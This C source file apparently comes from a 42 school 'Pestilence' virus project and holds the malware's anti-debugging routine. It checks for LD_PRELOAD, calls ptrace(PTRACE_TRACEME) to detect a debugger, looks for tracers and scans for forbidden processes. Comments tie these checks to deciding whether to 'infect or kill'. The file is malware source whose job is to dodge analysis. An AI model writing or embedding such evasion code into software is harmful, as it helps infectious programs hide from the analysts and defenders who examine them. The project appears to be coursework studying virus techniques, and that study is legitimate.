/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   stop_exectution.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 18:21:26 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 18:21:26 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <anti_debug.h>

char            stop_exection(t_aes *aes)
{
    const char *forbidens[] = FORBIDEN_PROCESS;

    if (getenv("LD_PRELOAD"))
        return (SUCCESS);
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == FAILURE) // check if Pestilence is a child process, if is true it means it bein debuged
        return (SUCCESS);
    if (check_tracers(aes))
        return (SUCCESS);
    if (check_process((char **)&forbidens[0]))
        return (SUCCESS);
    /* more shit to see later */
    return (FAILURE);
}

/* REMEMBER THAT RET SUCCES IF HAVE TO STOP */
/* if this return false i have to just not infect or kill ??? */